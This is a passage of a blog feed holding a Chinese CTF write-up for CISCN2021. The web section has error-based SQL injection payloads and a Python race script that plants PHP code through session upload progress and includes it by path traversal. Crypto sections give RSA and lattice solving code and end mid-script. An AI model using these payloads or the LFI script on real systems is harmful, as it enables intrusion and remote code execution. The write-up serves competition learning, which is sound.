            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOs报错记录</title>
      <link href="2021/09/24/CentOs%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BD%95/"/>
      <url>2021/09/24/CentOs%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="071fb79cd68f01b7a0263b846c007b44c2462036723a19af4d09b3788673103c">846031f3c0e2d4bcbb4508084706789f834894ad249960b41c5c6cf21d9a26da267ebcceb1edbd70c69be959f2c6a093aa2895f06c76f861f341fada79c65e1853cb4ec27aab58be87e58f8e36b318260f1fb45232f420e1322457b7452331e35c6e3283f6ffdf0f5d4c89e552230e16f76675aca85fc70e2bd92f553fbdfefa4d4b4863a25095111334b45d535c6826d158dd1cbbdf839491df2f89c4f0e471d4435c8c8e61f050e5641131b8f6df10139fe4e49e0ff592d028a2a324f75f795374759fa0dbb37cb84ef5247cc9e98e777d1c30295d4a9c9d016040b1698d9c2bf31e5a1e79ce30e8088c250253ba537f6f6c11dd45a03c22178fa52e17d8af1bc8be2b7147bb01e0c9cbcb8c26617f0e87a20a104f69ef50f38f356a70be03f46b3bfb9112d936f0f98006d90cf4ec9c14d0e8d71e496a04d9ceb016cd4b865a663f576a2be885477eaf00225cf39194ba1dbb70045430c95b7269a3b7dd2b815c4f5a929e4aa514306fa8c3fb6ade5439608abe09a1b49580d1135a9c69a205fde443b3ba8890a50ba1a7ea0c420a205d6771b7e02fd38f86a71027767f3becf52188272869f9daddbbc279dcd29fe2af0f3b0ebcdcae1d375ac9a5ba000df0ded8d630769f004b60a73c61b22a4e066a5338330be0c17f608445e746c0d9cc6a947e38de63d09685b6ae2a8c5724b5d29dc9bffee923eb5a2af75c8e4479f7c6d00aa7a8dbbbfe6c4db079bff1cef6d44c6d1a71e09a8c8dd56c55ebcf143e3fa2d1ab90e68e59ebe71cf49c992a657e0ddb5651c0f6815966f04ef0e3dad41d81f51619a3c40b8ebd9a7e63496bd3581201f8cfcdcbb2736707a7cb9459f385b257741ab45bf9439cbd3f2199b5e0a9877f848e0d49589f05741b1e5232acf192abfbdb9436abeb5bbbf5172e0a490241e568ddf815d4f2c3f30cb4b5e87b40363bc6b1d4581dac40b8fa1db37186a5c8374dc85b2a9a2541924d7ef2d6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2021</title>
      <link href="2021/05/16/CISCN2021/"/>
      <url>2021/05/16/CISCN2021/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><a id="more"></a><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy-sql"></a>easy-sql</h2><p>盲注，有报错：(‘’) and password=(‘’) LIMIT 0,1’ at line 1</p><p>写脚本</p><p>发现过滤了information</p><p>库：security</p><p>猜出表名 flag</p><p>选择报错注入 join，as爆列名</p><p>id no</p><p>d8088756-a82f-486a-a31c-8032d1590bff</p><p>试了好几遍，原来是列……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;)and(select extractvalue(0x0a,concat(0x0a,(select (select substr(group_concat(&#96;d8088756-a82f-486a-a31c-8032d1590bff&#96;),1,20) from flag)))))#&amp;passwd&#x3D;&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br><span class="line"></span><br><span class="line">uname&#x3D;&#39;)and(select extractvalue(0x0a,concat(0x0a,(select (select substr(group_concat(&#96;d8088756-a82f-486a-a31c-8032d1590bff&#96;),20,30) from flag)))))#&amp;passwd&#x3D;&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>多次出flag</p><blockquote><p>CISCN{Qn1ik-Q9MLB-pNYUn-Ye8VA-tdAX3-}</p></blockquote><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>发现备份文件：.index.php.swo</p><p>flag应该是藏在了注释里，应该是用php自带类库</p><p>PHP通过反射类ReflectionMethod和getDocComment 获取注释返回</p><p><a href="http://www.haimengli.com/php-tong-guo-fan-she-lei/?fileGuid=cKDQRHCPv6VjxWKx">http://www.haimengli.com/php-tong-guo-fan-she-lei/</a></p><p><img src="/2021/05/16/CISCN2021/1.png"></p><p>爆破各个函数</p><p><img src="/2021/05/16/CISCN2021/2.png"></p><blockquote><p>CISCN{rGDvG-RKMy5-dJWt3-KCIh8-3xzZp-}</p></blockquote><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p><img src="/2021/05/16/CISCN2021/3.png"></p><p>扫出/.listing文件</p><p><img src="/2021/05/16/CISCN2021/4.png"></p><p><img src="/2021/05/16/CISCN2021/5.png"></p><p>提供了phpinfo页面，结合文件包含：LFI with PHPInfo</p><p>awsl,phpinfo+lfi的脚本好难搞，我又菜……</p><p>搜索一波，可以借助phpinfo提供的sessionpath完成session文件上传竞争</p><p>这个脚本比较好找……好改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">sessid &#x3D; &#39;test&#39;</span><br><span class="line"></span><br><span class="line">def t1(session):</span><br><span class="line">    while True:</span><br><span class="line">        f &#x3D; &quot;&quot;</span><br><span class="line">        response &#x3D; requests.post(</span><br><span class="line">        url&#x3D;&#39;http:&#x2F;&#x2F;121.36.14.168:24395&#x2F;&#39;,</span><br><span class="line">        cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessid&#125;,</span><br><span class="line">        data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;5&#39; * 40 + &#39;&lt;?php var_dump(scandir(&quot;&#x2F;etc&#x2F;haffdebchd&#x2F;cfdidaddda&#x2F;afjacficij&#x2F;ggahijaeee&#x2F;bjcbcedaji&#x2F;fl444444g&quot;));?&gt;&#39;&#125;,</span><br><span class="line">        files&#x3D;&#123;&#39;file&#39;: (&#39;a.txt&#39;, f)&#125;,</span><br><span class="line">)</span><br><span class="line">def t2(session):</span><br><span class="line">    while True:</span><br><span class="line">        data &#x3D;&#123;</span><br><span class="line">            &#39;cf&#39;: &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;dhccbdgecg&#x2F;sess_test&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;&quot;http:&#x2F;&#x2F;121.36.14.168:24395&#x2F;&quot;, data&#x3D;data)</span><br><span class="line">        print(response.text)</span><br><span class="line">        if &#39;string&#39; in response.text:</span><br><span class="line">            break</span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">t1 &#x3D; threading.Thread(target&#x3D;t1, args&#x3D;(session,))</span><br><span class="line">t1.daemon &#x3D; True</span><br><span class="line">t1.start()</span><br><span class="line">t2(session)</span><br></pre></td></tr></table></figure><p>正好套了五层……</p><blockquote><p>CISCN{5azpA-eCNJC-ctcXm-vJzDU-jXPBS-}</p></blockquote><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>首先根据题意$$ex-yn=y(p+q+1)-z$$</p><p>那么可以造出格子求出$$x,y$$</p><p>再二分法求$$s=p+q$$</p><p>与虎符杯密码第二题类似，参照该题解出。<a href="https://tearsjin.xyz/page/2/?fileGuid=cKDQRHCPv6VjxWKx">https://tearsjin.xyz/page/2/</a></p><p>有题意，$$a=0$$,带点可求$$b$$</p><p>求$$e在阶下的逆元$$</p><p>求$$G=dP$$</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">n&#x3D;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span><br><span class="line">half_n&#x3D;int(sqrt(n))</span><br><span class="line">e&#x3D;67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span><br><span class="line">M&#x3D;matrix([[half_n,e],</span><br><span class="line">[0,-n]])</span><br><span class="line">L&#x3D;M.LLL()[0]</span><br><span class="line">mm&#x3D;matrix([-235436912945336662391026124471105219395770217328162018931594609419582745114251948238840212881814533708592325776478635076056630520429862826686225762483017735282225173655229129488512828712599656980161312082481987496707036067942329100,-406850608655407486298019095013146348847805975120061760929682791882948049742096195978800022454159691659865169100330308708576847735609146508679126419372034710027124703842712262177437006326228856546452636094881051757653949488135598409])</span><br><span class="line">bound&#x3D;int(sqrt(2*n))&#x2F;&#x2F;12</span><br><span class="line">x,y&#x3D;26279444166664821795077701675621823220865336004430428203703688888211697122228,22131877391133483964429946329193825460775374851078084751208971056041193500203</span><br><span class="line">assert x&lt;bound</span><br><span class="line">assert y&lt;bound&#x2F;&#x2F;x</span><br><span class="line">def magic(K,N):</span><br><span class="line">l &#x3D; 0</span><br><span class="line">r &#x3D; K</span><br><span class="line">for i in range(515):</span><br><span class="line">s &#x3D; (l+r)&#x2F;&#x2F;2</span><br><span class="line">v &#x3D; s*s-int(9*s^2*(K-1-s)*(K-1-s))&#x2F;&#x2F;(round(N^0.25)*round(N^0.25))</span><br><span class="line">if v&lt;4*N:</span><br><span class="line">l&#x3D;s</span><br><span class="line">else:</span><br><span class="line">r&#x3D;s</span><br><span class="line">return r</span><br><span class="line">e&#x3D;67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span><br><span class="line">x,y&#x3D;26279444166664821795077701675621823220865336004430428203703688888211697122228,22131877391133483964429946329193825460775374851078084751208971056041193500203</span><br><span class="line">n&#x3D;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span><br><span class="line">k&#x3D;e*x-y*n</span><br><span class="line">K&#x3D;k&#x2F;&#x2F;y</span><br><span class="line">s&#x3D;magic(K,n)</span><br><span class="line">print(s)</span><br><span class="line">from z3 import *</span><br><span class="line">s&#x3D;Solver()</span><br><span class="line">p,q&#x3D;Ints(&quot;p q&quot;)</span><br><span class="line">s.add(p+q&#x3D;&#x3D;18383013852155207284866834850624501649134164688503883162216824258842790032992437383933186349369945088653252318167911285710266631681220716855493349532603970)</span><br><span class="line">s.add(p*q&#x3D;&#x3D;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281)</span><br><span class="line">if s.check()&#x3D;&#x3D;sat:</span><br><span class="line">print(s.model())</span><br><span class="line">a&#x3D;0</span><br><span class="line">b&#x3D;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421103469394495274706241578726021598690355239783781433785479293793926265140251884444575671410967573946453503486277025286699273827984004452338</span><br><span class="line">e &#x3D; 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span><br><span class="line">p&#x3D;7137110102022535123348664656689848983548191256934755709215236325084864398993149288243244941561397379979025441681860286823605147363784020425000696750337273</span><br><span class="line">q&#x3D;11245903750132672161518170193934652665585973431569127453001587933757925633999288095689941407808547708674226876486050998886661484317436696430492652782266697</span><br><span class="line">phi&#x3D;(p+1)*(q+1)</span><br><span class="line">x,y&#x3D;6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605, 38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span><br><span class="line">d&#x3D;inverse_mod(e,phi)</span><br><span class="line">C&#x3D;E([x,y])</span><br><span class="line">G&#x3D;d*C</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">print(long_to_bytes(G[0])+long_to_bytes(G[1]))</span><br><span class="line">#CISCN&#123;e91fef4ead7463b13d00bda65f540477&#125;</span><br></pre></td></tr></table></figure><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>送分题，低指数爆破，共模攻击，已知高位攻击，求出明文拼接后求md5.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">#共模</span><br><span class="line">e1 &#x3D; 17</span><br><span class="line">e2 &#x3D;65537</span><br><span class="line">n &#x3D;111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span><br><span class="line">c1 &#x3D;54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br><span class="line">c2 &#x3D;91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br><span class="line">_, r, s &#x3D; gmpy2.gcdext(e1, e2)</span><br><span class="line">m &#x3D; pow(c1, r, n) * pow(c2, s, n) % n</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">#爆破</span><br><span class="line">n&#x3D;</span><br><span class="line">e&#x3D;3</span><br><span class="line">c&#x3D;</span><br><span class="line">k&#x3D;0</span><br><span class="line">while True:</span><br><span class="line">      a&#x3D;iroot(c+k*n,3)</span><br><span class="line">      if a[1]:</span><br><span class="line">          print(long_to_bytes(a[0]))</span><br><span class="line">#高位</span><br><span class="line">n &#x3D;</span><br><span class="line">e &#x3D;</span><br><span class="line">c &#x3D;</span><br><span class="line">pbar &#x3D;</span><br><span class="line">kbits &#x3D;</span><br><span class="line">print(&quot;upper %d bits (of %d bits) is given&quot; % (pbar.nbits()-kbits, pbar.nbits()))</span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; x + pbar</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.4)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.4</span><br><span class="line">p &#x3D; x0 + pbar</span><br><span class="line">print(&quot;p:&quot;, p)</span><br><span class="line">q &#x3D; n &#x2F;&#x2F; int(p)</span><br><span class="line">d &#x3D; inverse_mod(e, (p-1)*(q-1))</span><br><span class="line">print(&quot;m:&quot;, pow(c, d, n))</span><br><span class="line">      </span><br></pre></td></tr></table></figure><h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p>首先根据test数据可以求到key的四种可能性，由于有些元素求反导致，所以只需要将四个密钥两两组合爆破，根据加密代倒推ch，ch倒推seq，进而求x,r,爆破x0最终可以得到各个参数分别为：r=1.2</p><p>key1=169</p><p>key2=78</p><p>x0=0.840264</p><p>再解出image即可，需要注意的是，这里是py2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">testcipher&#x3D;[131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174]</span><br><span class="line">testimage&#x3D;[205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31]</span><br><span class="line">pos_key1&#x3D;[x^y for x,y in zip(testcipher,testimage)]</span><br><span class="line">print(pos_key1)</span><br><span class="line">keys&#x3D;[]</span><br><span class="line">for i in pos_key1:</span><br><span class="line">    if i not in keys:</span><br><span class="line">        keys.append(i)</span><br><span class="line">print(keys)</span><br><span class="line">key1&#x3D;169</span><br><span class="line">key2&#x3D;78</span><br><span class="line">ch&#x3D;&quot;&quot;</span><br><span class="line">for i in range(len(testimage)):</span><br><span class="line">    if (testimage[i]^key1&#x3D;&#x3D;testcipher[i]):</span><br><span class="line">        ch+&#x3D;&quot;0&quot;</span><br><span class="line">        </span><br><span class="line">    if (~testimage[i]^key1&#x3D;&#x3D;testcipher[i]):</span><br><span class="line">        ch+&#x3D;&quot;1&quot;</span><br><span class="line">        </span><br><span class="line">    if (testimage[i]^key2&#x3D;&#x3D;testcipher[i]):</span><br><span class="line">        ch+&#x3D;&quot;2&quot;</span><br><span class="line">        </span><br><span class="line">    if (~testimage[i]^key2&#x3D;&#x3D;testcipher[i]):</span><br><span class="line">        ch+&#x3D;&quot;3&quot;</span><br><span class="line">        </span><br><span class="line">num&#x3D;16*16&#x2F;&#x2F;8</span><br><span class="line">seq&#x3D;[]</span><br><span class="line">for i in range(len(ch)):</span><br><span class="line">    seq.append(bin(int(ch[i]))[2:].zfill(2))</span><br><span class="line">print(seq)</span><br><span class="line">seqs&#x3D;[]</span><br><span class="line">for i in seq:</span><br><span class="line">    seqs.append(float(i)&#x2F;22000)</span><br><span class="line">tmps&#x3D;[round(seq&#x2F;22000,6) for seq in seqs]</span><br><span class="line">#solve the x[0] and x0</span><br><span class="line">v&#x3D;round(tmps[0],6)</span><br><span class="line">for i in range(1000):</span><br><span class="line">    tmpv&#x3D;v-1000*0.000001+i*0.000001</span><br><span class="line">    Flag&#x3D;True</span><br><span class="line">    for j in range(0,len(seqs)):</span><br><span class="line">        </span><br><span class="line">        if int(seqs[j]!&#x3D;int(tmpv*22000)):</span><br><span class="line">            #print(seqs[j],int(tmpv*22000))</span><br><span class="line">            Flag&#x3D;False</span><br><span class="line">        tmpv&#x3D;generate(tmpv,r)</span><br><span class="line">    if Flag:</span><br><span class="line">        print(&quot;found x[0]:&quot;+str(v-1000*0.000001+i*0.000001))</span><br><span class="line">def generate(x):</span><br><span class="line">    return round(r*x*(3-x),6)</span><br><span class="line">c&#x3D;[198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]</span><br><span class="line">r&#x3D;1.2</span><br><span class="line">key1&#x3D;169</span><br><span class="line">key2&#x3D;78</span><br><span class="line">x0&#x3D;0.840264</span><br><span class="line">m&#x3D;24</span><br><span class="line">n&#x3D;16</span><br><span class="line">def decrypt(c,key1,key2,x0,m,n):</span><br><span class="line">    flag&#x3D;[]</span><br><span class="line">    num &#x3D; m*n&#x2F;&#x2F;8    </span><br><span class="line">    seqs &#x3D; []</span><br><span class="line">    x &#x3D; x0</span><br><span class="line">    bins &#x3D; &#39;&#39;</span><br><span class="line">    tmp &#x3D; []</span><br><span class="line">    for i in range(num):</span><br><span class="line">        x &#x3D; generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(int(x*22000))</span><br><span class="line">    for x in seqs:</span><br><span class="line">        bin_x  &#x3D; bin(x)[2:]</span><br><span class="line">        if len(bin_x) &lt; 